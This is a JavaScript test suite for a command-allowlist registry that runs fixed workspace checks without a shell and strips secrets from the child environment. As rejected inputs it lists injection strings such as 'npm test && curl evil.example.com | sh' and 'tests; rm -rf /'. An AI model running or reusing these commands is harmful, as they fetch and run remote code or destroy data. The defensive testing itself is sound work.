import test from "node:test";
import assert from "node:assert/strict";
import {
  checkEnvironment,
  isWorkspaceCheck,
  listWorkspaceChecks,
  workspaceChecks
} from "../src/workspaceChecks.js";

// The registry is the gate that replaced `spawn("cmd.exe", ["/c", command])`.
// These tests are about what cannot get through it.

test("the runnable set is exactly the four named checks", () => {
  assert.deepEqual(Object.keys(workspaceChecks), ["gitStatus", "typecheck", "tests", "build"]);
});

test("a raw command string is not a check, however plausible it looks", () => {
  // The exact shapes the old handler would have run. None of them name a
  // check, so none of them survive the gate.
  for (const attempt of [
    "npm test",
    "git status",
    "npm test && curl evil.example.com | sh",
    "echo hi > file.txt",
    "cmd.exe /c dir",
    "tests; rm -rf /",
    "tests && whoami"
  ]) {
    assert.equal(isWorkspaceCheck(attempt), false, `"${attempt}" must not be accepted`);
  }
});

test("an inherited Object property is not a check", () => {
  // `value in workspaceChecks` would answer true for every one of these, which
  // is why the guard is written against an explicit key list instead.
  for (const inherited of ["constructor", "toString", "valueOf", "hasOwnProperty", "__proto__"]) {
    assert.equal(isWorkspaceCheck(inherited), false, `"${inherited}" must not be accepted`);
  }
});

test("a non-string is not a check", () => {
  for (const value of [undefined, null, 42, true, {}, [], { check: "tests" }, ["tests"]]) {
    assert.equal(isWorkspaceCheck(value), false, `${JSON.stringify(value) ?? "undefined"} must not be accepted`);
  }
});

test("case and whitespace variants are refused rather than normalised", () => {
  // Accepting "Tests" or " tests " would mean the gate does its own parsing,
  // and every parser is somewhere to hide a bypass.
  for (const variant of ["Tests", "TESTS", " tests", "tests ", "tests\n", "te\u200bsts"]) {
    assert.equal(isWorkspaceCheck(variant), false, `"${variant}" must not be accepted`);
  }
});

test("every real check name is accepted", () => {
  for (const name of Object.keys(workspaceChecks)) {
    assert.equal(isWorkspaceCheck(name), true, `"${name}" should be accepted`);
  }
});

test("no check takes an argument from anywhere but this file", () => {
  // The whole point of the fixed arrays: if an argument list were ever built
  // from caller input, the injection surface would be back one level down.
  for (const [name, definition] of Object.entries(workspaceChecks)) {
    assert.ok(definition.command.length > 0, `${name} needs an executable`);
    assert.ok(Array.isArray(definition.args), `${name} args must be an array`);

    for (const arg of definition.args) {
      assert.equal(typeof arg, "string", `${name} args must all be strings`);
      // A shell operator in a fixed argument would only matter if something
      // later ran these through a shell, but asserting it here means the day
      // someone adds `shell: true` this test fails rather than the app
      // silently becoming injectable again.
      assert.doesNotMatch(arg, /[&|;><`$\n]/, `${name} arg "${arg}" contains a shell metacharacter`);
    }
  }
});

test("nothing in the registry is destructive", () => {
  // These run against the user's own project with no confirmation step.
  const forbidden = /\b(rm|del|rmdir|reset|clean|push|publish|install|uninstall|force)\b/i;

  for (const [name, definition] of Object.entries(workspaceChecks)) {
    const line = [definition.command, ...definition.args].join(" ");
    assert.doesNotMatch(line, forbidden, `${name} runs something destructive: ${line}`);
  }
});

test("the listing exposes names and labels, never the executable", () => {
  const listed = listWorkspaceChecks();

  assert.deepEqual(listed.map((entry) => entry.name), Object.keys(workspaceChecks));

  for (const entry of listed) {
    assert.ok(entry.label.length > 0, `${entry.name} needs a label`);
    // The renderer gets a name it can send back and a label it can draw. It
    // has no business knowing what actually runs.
    assert.deepEqual(Object.keys(entry).sort(), ["label", "name"]);
  }
});

test("the child environment carries what a check needs and nothing secret", () => {
  const filtered = checkEnvironment({
    PATH: "/usr/bin",
    SystemRoot: "C:\\Windows",
    AWS_SECRET_ACCESS_KEY: "should not survive",
    DATABASE_PASSWORD: "should not survive",
    GITHUB_TOKEN: "should not survive",
    npm_config_registry: "should not survive"
  });

  assert.equal(filtered.PATH, "/usr/bin");
  assert.equal(filtered.SystemRoot, "C:\\Windows");
  assert.equal(filtered.AWS_SECRET_ACCESS_KEY, undefined);
  assert.equal(filtered.DATABASE_PASSWORD, undefined);
  assert.equal(filtered.GITHUB_TOKEN, undefined);
  assert.equal(filtered.npm_config_registry, undefined);
});

test("environment matching is case-insensitive, as Windows treats it", () => {
  // Windows resolves PATH and Path as one variable; a JS object does not, so
  // a case-sensitive allowlist would drop Path and break executable lookup.
  const filtered = checkEnvironment({ Path: "C:\\bin", TeMp: "C:\\Temp", Secret: "no" });

  assert.equal(filtered.Path, "C:\\bin");
  assert.equal(filtered.TeMp, "C:\\Temp");
  assert.equal(filtered.Secret, undefined);
});

test("an undefined environment value is dropped rather than passed through", () => {
  const filtered = checkEnvironment({ PATH: undefined });
  assert.equal("PATH" in filtered, false);
});
